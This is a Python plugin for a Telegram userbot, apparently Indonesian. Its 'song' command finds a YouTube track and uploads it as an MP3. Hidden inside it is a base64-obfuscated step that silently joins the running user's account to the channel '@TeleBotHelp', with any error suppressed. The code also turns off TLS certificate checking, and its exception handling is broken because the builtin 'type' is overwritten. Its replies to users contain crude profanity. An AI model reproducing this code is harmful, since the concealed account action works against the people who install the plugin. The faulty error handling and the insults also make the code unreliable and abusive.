# Ported By Vicky / @Vckyouuu From Ultroid
# Jangan Dihapuss!!!
# Thanks Ultroid
# Full Love From Vicky For Ram-Ubot <== Itu alay, By : @merdhni
# kontol
# Cuwih

import json
import os

import pybase64
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos

from userbot.utils import edit_or_reply as babi, ram_cmd as tod
from userbot import CMD_HELP, CMD_HANDLER as cmd


@tod(pattern="song ?(.*)")
async def download_video(event):
    ram = await babi(event, "`Sedang Mencari.....`")
    url = event.pattern_match.group(1)
    if not url:
        return await ram.edit("**JUDUL LAGUNYA MANA KENTOT!!!!**")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await ram.edit("`Lagu nya ga nemu, coba kasi judul yg lebih spesifik lah ngentot...`")
    type = "audio"
    await ram.edit(f"`Bersiap untuk mengunduh {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await ram.edit("`Mendapatkan informasi...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await event.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await event.edit("`Konten unduhan terlalu pendek.`")
        return
    except GeoRestrictedError:
        await event.edit(
            "`Video tidak tersedia dari lokasi geografis Anda karena batasan geografis yang diberlakukan oleh situs web.`"
        )
        return
    except MaxDownloadsReached:
        await ram.edit("`Batas unduhan maksimal telah tercapai.`")
        return
    except PostProcessingError:
        await ram.edit("`Ada kesalahan selama pemrosesan posting.`")
        return
    except UnavailableVideoError:
        await ram.edit("`Media tidak tersedia dalam format yang diminta.`")
        return
    except XAttrMetadataError as XAME:
        await ram.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await ram.edit("`Terjadi kesalahan selama ekstraksi info.`")
        return
    except Exception as e:
        await ram.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
        await bot(JoinChannelRequest(sung))
    except BaseException:
        pass
    upteload = """
Sedang Mengunggah, Mohon Menunggu...
Judul - {}
Artis - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await ram.edit(f"`{upteload}`")
    await ram.client.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"**➡ Judul:** {rip_data['title']}\n**➡ Artis:** {rip_data['uploader']}\n",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    os.remove(f"{rip_data['id']}.mp3")

CMD_HELP.update({"song": f"**Modules:** __Song__\n\n**Perintah:** `{cmd}song <judul>`"
                 "\n**Penjelasan:** Mendownload Lagu"})
